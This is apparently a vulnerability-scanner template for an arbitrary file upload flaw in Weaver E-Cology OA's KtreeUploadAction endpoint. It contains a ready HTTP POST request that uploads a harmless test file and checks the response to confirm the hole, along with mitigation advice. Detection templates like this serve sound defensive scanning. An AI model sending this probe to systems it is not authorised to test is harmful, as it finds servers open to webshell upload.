app: Weaver
query: app:"weaver"
meta:
  name: 泛微 E-Cology KtreeUploadAction 任意文件上传漏洞
  level: 4
  tags:
  - file_upload
  description: 泛微OA E-Cology KtreeUploadAction 存在文件上传漏洞，攻击者可通过漏洞上传webshell，达到控制web服务器的权限
  homepage: ""
  author: X prism
  references: ""
  solution: |-
    1、如⾮必要，禁⽌公⽹访问该系统。
    2、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。
    3、升级产品到最新版本
  create_at: "2024-07-13 11:33:16"
  available: false
  steps:
    variable: []
    verify_steps:
      type: and
      verify:
      - request:
          method: POST
          path: /weaver/com.weaver.formmodel.apps.ktree.servlet.KtreeUploadAction?action=image
          redirect: true
          header:
          - Content-Type: multipart/form-data; boundary=--------1638451160
          - Cookie: Secure; JSESSIONID=abc6xLBV7S2jvgm3CB50w; Secure; testBanCookie=test
          params: |-
            ----------1638451160
            Content-Disposition: form-data; name="test"; filename="test.txt"
            Content-Type: application/octet-stream

            test
            ----------1638451160--
        response:
        - name: code
          value: "200"
          type: equals
        - name: body
          value: formmode/apps/upload
          type: contains
    exploit_steps:
      type: ""
      params:
        name: ""
        type: input
        value: ""
